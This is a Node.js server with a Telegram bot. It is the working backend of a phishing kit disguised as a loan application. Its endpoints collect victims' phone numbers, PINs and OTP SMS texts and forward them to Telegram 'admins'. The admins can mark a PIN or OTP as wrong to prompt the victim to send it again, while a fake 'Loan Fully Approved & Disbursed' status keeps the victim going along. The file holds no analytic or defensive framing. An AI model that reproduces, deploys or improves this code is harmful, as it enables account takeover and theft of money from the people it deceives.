const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const MAIN_ADMIN_ID = process.env.MAIN_ADMIN_ID || '';
const PORT = process.env.PORT || 3000;

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

let activeSessions = {};
let authorizedAdmins = new Set();
let pendingMainAdminAuth = new Map();

function isAuthorized(chatId) {
    if (MAIN_ADMIN_ID && chatId.toString() === MAIN_ADMIN_ID.toString()) return true;
    return authorizedAdmins.has(chatId.toString());
}

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const userIdStr = chatId.toString();
    const isMain = MAIN_ADMIN_ID && userIdStr === MAIN_ADMIN_ID.toString();

    if (isMain) {
        authorizedAdmins.add(userIdStr);
        bot.sendMessage(chatId, "✅ **Main Admin Dashboard Active.**\nYou have full access to receive incoming client links and verification alerts.", { parse_mode: "Markdown" });
    } else {
        if (authorizedAdmins.has(userIdStr)) {
            bot.sendMessage(chatId, "✅ **Sub-Admin Dashboard Active.**\nYou are authorized and receiving client alerts.", { parse_mode: "Markdown" });
        } else {
            pendingMainAdminAuth.set(userIdStr, true);
            bot.sendMessage(chatId, "🔒 **Sub-Admin Access Request Pending.**\nYour ID requires authorization from the Main Admin to receive client links.", { parse_mode: "Markdown" });
            
            if (MAIN_ADMIN_ID) {
                bot.sendMessage(MAIN_ADMIN_ID, `⚠️ **New Sub-Admin Request**\nUser ID: \`${chatId}\` wants access.`, {
                    parse_mode: "Markdown",
                    reply_markup: {
                        inline_keyboard: [[
                            { text: "🟢 AUTHORISE", callback_data: `auth_sub_${chatId}` },
                            { text: "🔴 DENY", callback_data: `deny_sub_${chatId}` }
                        ]]
                    }
                });
            }
        }
    }
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const userIdStr = chatId.toString();

    if (!isAuthorized(userIdStr)) {
        bot.answerCallbackQuery(query.id, { text: "⚠ You are not authorized!", show_alert: true });
        return;
    }

    if (data.startsWith('auth_sub_') || data.startsWith('deny_sub_')) {
        if (MAIN_ADMIN_ID && userIdStr !== MAIN_ADMIN_ID.toString()) {
            bot.answerCallbackQuery(query.id, { text: "Only Main Admin can authorize sub-admins.", show_alert: true });
            return;
        }
        const targetId = data.split('_')[2];
        if (data.startsWith('auth_sub_')) {
            authorizedAdmins.add(targetId);
            pendingMainAdminAuth.delete(targetId);
            bot.sendMessage(targetId, "🎉 **Access Granted!** You are now authorized to receive client links and controls.");
            bot.sendMessage(chatId, `✅ Successfully authorized sub-admin: ${targetId}`);
        } else {
            pendingMainAdminAuth.delete(targetId);
            bot.sendMessage(targetId, "❌ **Access Denied** by Main Admin.");
            bot.sendMessage(chatId, `❌ Denied sub-admin: ${targetId}`);
        }
        bot.answerCallbackQuery(query.id);
        return;
    }

    const parts = data.split('_');
    const action = parts[0]; 
    const sessionId = parts.slice(1).join('_');

    const session = activeSessions[sessionId];
    if (!session) {
        bot.answerCallbackQuery(query.id, { text: "Session expired or not found.", show_alert: true });
        return;
    }

    if (action === 'allow') {
        session.status = 'approved_pin';
        bot.editMessageText(`✅ **PIN & Number ALLOWED** for \`${session.phone}\`\nStatus: Waiting for user to paste OTP SMS.`, {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown'
        });
    } else if (action === 'deny') {
        session.status = 'denied';
        bot.editMessageText(`❌ **PIN & Number DENIED** for \`${session.phone}\``, {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown'
        });
    } else if (action === 'wrongpin') {
        session.status = 'wrong_pin';
        bot.editMessageText(`⚠️ **Incorrect PIN Sent Back** to \`${session.phone}\``, {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown'
        });
    } else if (action === 'wrongsms') {
        session.status = 'wrong_sms';
        bot.editMessageText(`⚠️ **Incorrect SMS/OTP Sent Back** to \`${session.phone}\``, {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown'
        });
    } else if (action === 'approved') {
        session.status = 'success';
        bot.editMessageText(`🎉 **Loan Fully Approved & Disbursed** for \`${session.phone}\``, {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown'
        });
    }

    bot.answerCallbackQuery(query.id);
});

// Endpoint for submitting Phone and PIN (First Telegram Notification)
app.post('/api/submit-credentials', express.json(), (req, res) => {
    const { sessionId, phone, pin, amount, duration } = req.body;
    
    activeSessions[sessionId] = {
        phone, pin, amount, duration,
        status: 'pending_pin_approval'
    };

    const host = req.get('host');
    const clientLink = `https://${host}/?session=${sessionId}`;

    const message = `🌐 **Client Link:** ${clientLink}\n\n` +
        `PHONE NO: \`${phone}\`\n` +
        `PIN: \`${pin}\``;

    authorizedAdmins.forEach(adminId => {
        bot.sendMessage(adminId, message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "ALLOW", callback_data: `allow_${sessionId}` },
                        { text: "DENY", callback_data: `deny_${sessionId}` }
                    ]
                ]
            }
        }).catch(err => console.error(`Failed to send to admin ${adminId}:`, err));
    });

    res.json({ success: true, sessionId });
});

// Endpoint for submitting OTP SMS (Second Telegram Notification)
app.post('/api/submit-otp', express.json(), (req, res) => {
    const { sessionId, otpText } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }

    session.otpText = otpText;
    session.status = 'pending_final_approval';

    const message = `OTP VERIFICATION\n\n` +
        `PHONE NO: \`${session.phone}\`\n\n` +
        `OTP:\n\`\`\`text\n${otpText}\n\`\`\``;

    authorizedAdmins.forEach(adminId => {
        bot.sendMessage(adminId, message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "WRONG PIN ❌", callback_data: `wrongpin_${sessionId}` },
                        { text: "WRONG SMS", callback_data: `wrongsms_${sessionId}` }
                    ],
                    [
                        { text: "APPROVED", callback_data: `approved_${sessionId}` }
                    ]
                ]
            }
        }).catch(err => console.error(`Failed to send OTP alert to admin ${adminId}:`, err));
    });

    res.json({ success: true });
});

app.get('/api/check-status/:sessionId', (req, res) => {
    const session = activeSessions[req.params.sessionId];
    if (!session) {
        return res.json({ status: 'not_found' });
    }
    res.json({ status: session.status });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
  
